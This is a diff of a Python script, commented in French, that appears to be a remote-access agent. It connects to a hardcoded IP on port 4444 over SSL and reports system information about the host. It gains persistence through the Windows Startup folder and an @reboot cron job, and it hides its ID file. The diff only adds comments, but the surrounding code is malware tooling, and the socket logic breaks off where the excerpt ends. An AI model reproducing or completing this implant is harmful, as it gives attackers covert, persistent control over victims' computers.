@@ -11,12 +11,13 @@ import uuid
 SERVER_HOST = "57.129.5.161"  # remplacer par l'adresse IP du serveur
 SERVER_PORT = 4444
 
+# detection de Windows
 def is_windows():
     return os.name == "nt"
-
+# detection de Linux
 def is_linux():
     return os.name == "posix"
-
+# ajout dans le dossier startup pour la persistence Windows
 def add_to_startup():
     script_path = os.path.abspath(__file__)
     startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -28,6 +29,7 @@ def add_to_startup():
     except Exception as e:
         print(f"Erreur lors de l'ajout au dossier Startup : {e}")
 
+# ajout d'un crontab pour la persistence Linux
 def create_cron_job():
     script_path = os.path.abspath(__file__)
     cron_command = f"@reboot sleep 30 && python3 {script_path}"
@@ -43,6 +45,7 @@ def create_cron_job():
     except Exception as e:
         print(f"Erreur lors de l'ajout de la tâche cron : {e}")
 
+# recupère ou créer un UID pour identifier l'agent 
 def get_or_create_uid():
     uid_file = ".agent_uid" if os.name != "nt" else "agent_uid.txt"
     if os.path.exists(uid_file):
@@ -55,7 +58,7 @@ def get_or_create_uid():
         if os.name == "nt":
             os.system(f"attrib +h {uid_file}")
         return uid
-
+# recuperation des infos du client
 def get_system_info():
     return {
         "uid": get_or_create_uid(), 
@@ -68,6 +71,7 @@ def get_system_info():
         "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     }
 
+# démarrage de l'agent avec la connexion ssl
 def start_agent():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
